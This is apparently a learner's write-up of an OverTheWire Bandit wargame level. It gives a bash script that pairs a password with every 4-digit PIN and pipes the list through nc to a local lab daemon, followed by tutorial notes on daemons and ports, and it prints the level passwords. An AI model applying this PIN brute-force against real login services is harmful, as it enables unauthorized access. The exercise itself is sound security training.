# 🔐 Bandit Level: Bandit23 ➝ Bandit24

## 📂 Command(s) used:
👉 
- mkdir /tmp/somya123
- cd /tmp/somya123
- nano bruteforce.sh
- #!/bin/bash
for i in {0000..9999}; do
  echo "gb8KRRcsshuZXI0tUuR6ypOFjiZbf3G8 $i"
done > list.txt
- ctrl + O --> enter
- ctrl + x
- chmod +x bruteforce.sh
- ./bruteforce.sh
- ls
- cat list.txt | nc localhost 30002


## 📄 Password found:
👉 iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
## Notes 


## 📌 Problem
- A daemon is running on **localhost:30002**
- It expects input in the format:
<bandit24_password> <4-digit PIN>
- Goal: Bruteforce all PINs (0000–9999) to find the correct one.

---

## 🔑 Step 1: Make a brute force list

```bash
#!/bin/bash
for i in {0000..9999}; do
  echo "gb8KRRcsshuZXI0tUuR6ypOFjiZbf3G8 $i"
done > list.txt
```
- **Explanation:**
- {0000..9999} generates all numbers from 0000 → 9999
- echo "password PIN" prints each possibility
- > list.txt saves output in a file
## 🔑 Step 2: Send input to the daemon
```
cat list.txt | nc localhost 30002
```
**Explanation:**
- cat list.txt → read file line by line
- | (pipe) → forward output
- nc localhost 30002 → connects to daemon on port 30002 and sends data

---
# Daemon & Listening on Port – Easy Notes

## 1️⃣ What is a Daemon?
| Feature | Explanation | Real Life Example |
|---------|-------------|-----------------|
| Background Process | Runs without direct user interaction | Watchman standing outside a building |
| Continuous | Starts at system boot and keeps running | Clock ticking 24/7 |
| Service Provider | Provides services like SSH, web server, cron jobs | Security camera monitoring continuously |
| Name Origin | Greek word *daimon* = guiding spirit | Invisible helper program |

**Examples in Linux:**
- sshd → Handles SSH logins
- httpd → Apache/Nginx web server
- crond → Runs scheduled cron jobs

---

## 2️⃣ What is a Port?
| Term | Explanation | Example |
|------|------------|---------|
| Port | A gate for data to enter/leave computer | Port 22 → SSH, Port 80 → HTTP |
| Listening | Daemon is ready to accept connections | sshd listens on port 22, httpd listens on 80/443 |
| Connection | Data sent/received through a port | Browser connecting to web server via port 80 |

**Real Life Analogy:**  
Different doors of a house = different ports  
- Kitchen door = port 22 (SSH)  
- Living room door = port 80 (HTTP)  
Watchman at a door = daemon **listening** at that port

---

## 3️⃣ Daemon Listening on Port
- Means: The daemon is active and waiting for incoming connections on that port.
- Example:
  - sshd daemon listening on port 22 → ready for SSH login
  - httpd daemon listening on port 80 → ready for web requests
  - Bandit level daemon listening on port 30002 → waiting for your input to give next password

---

## 4️⃣ How to Check Listening Ports (Without sudo)
### Modern command
```
ss -tuln
```
### Old command (without sudo)
```
netstat -tuln
```
### Check processes interacting with ports
```
lsof -i -P -n 2>/dev/null | grep LISTEN
```
### Check running daemons
```
ps aux | grep -E "ssh|http|cron"
```
- Output Example:
Netid | State  | Local Address:Port |  Peer Address:Port | 
tcp  |  LISTEN | 0.0.0.0:22      |     0.0.0.0:*  |
tcp  |  LISTEN | 127.0.0.1:30002    |  0.0.0.0:*  
- 0.0.0.0:22 → sshd daemon listening on port 22
- 127.0.0.1:30002 → Bandit daemon waiting on port 30002
## 5️⃣ Connect to a Daemon (Bandit Example)
### Connect to local daemon on port 30002
```
nc localhost 30002
```
OR
```
nc 127.0.0.1 30002
```
- After connecting, daemon may ask for input (e.g., password)
- Correct input → daemon returns next Bandit password
- Wrong input → daemon shows error or rejection message
**Analogy:**
- Port = door
- Daemon = watchman
Your command/input = message to the watchman
- Correct message → he gives you the key/password
## ✅ Summary:
- Daemon = invisible background helper
- Port = entry/exit gate for network data
- Listening on port = daemon is ready for connections
- Bandit style = connect via nc to interact with daemon
